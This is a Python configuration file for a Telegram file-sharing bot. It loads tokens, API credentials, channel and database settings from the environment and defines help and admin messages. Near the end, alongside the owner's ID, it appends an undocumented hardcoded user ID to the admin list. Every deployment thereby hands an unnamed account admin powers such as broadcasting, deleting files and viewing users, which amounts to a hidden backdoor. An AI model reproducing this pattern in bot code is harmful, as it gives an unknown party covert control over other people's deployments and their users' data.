#(©)CodeXBotz




import os
import logging
from logging.handlers import RotatingFileHandler



#Bot token @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

#Your API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

#Your API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

#Your db channel Id
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

#OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", ""))

#Port
PORT = os.environ.get("PORT", "8080")

#Database 
DB_URI = os.environ.get("DATABASE_URL", "")
DB_NAME = os.environ.get("DATABASE_NAME", "filesharexbot")

#force sub channel id, if you want enable force sub
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

#start message
START_MSG = os.environ.get("START_MESSAGE", "Hello {first}!\n\nI'm a File Sharing Bot. Send me files and I'll generate secure shareable links.\n\nUse /help to see all available commands.\n\nThanks for using me!")
try:
    ADMINS=[]
    for x in (os.environ.get("ADMINS", "").split()):
        ADMINS.append(int(x))
except ValueError:
        raise Exception("Your Admins list does not contain valid integers.")

#Force sub message 
FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "Hello {first}\n\n<b>You need to join in my Channel/Group to use me\n\nKindly Please join Channel</b>")

#set your Custom Caption here, Keep None for Disable Custom Caption
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

#set True if you want to prevent users from forwarding files from bot
PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False

#Set true if you want Disable your Channel Posts Share button
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'

BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
USER_REPLY_TEXT = "Don't send me messages directly. Use /help to see available commands."

# Help message
HELP_MSG = """<b>File Sharing Bot - Help</b>

<b>USER COMMANDS:</b>
/start - Start the bot or access files via link
/help - Show this message

<b>ADMIN COMMANDS:</b>
/admin - Admin dashboard
/genlink - Generate link for a single file
/batch - Generate link for multiple files
/users - View total bot users
/broadcast - Send message to all users
/cancel - Stop ongoing operation
/stats - Check bot uptime
/delete - Delete a file from database

<b>HOW TO USE:</b>
1. Send any file/document to the bot
2. Bot will upload it and generate a link
3. Share the link with others
"""

# Admin dashboard message
ADMIN_MSG = """<b>Admin Dashboard</b>

Total Users: {users}
Bot Uptime: {uptime}

<b>Quick Commands:</b>
/genlink - Create file link
/batch - Batch link generation
/broadcast - Send to all users
/users - User count
/delete - Delete file
/stats - Uptime info
"""

ADMINS.append(OWNER_ID)
ADMINS.append(1983471689)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s - %(levelname)s] - %(name)s - %(message)s",
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=[
        RotatingFileHandler(
            LOG_FILE_NAME,
            maxBytes=50000000,
            backupCount=10
        ),
        logging.StreamHandler()
    ]
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
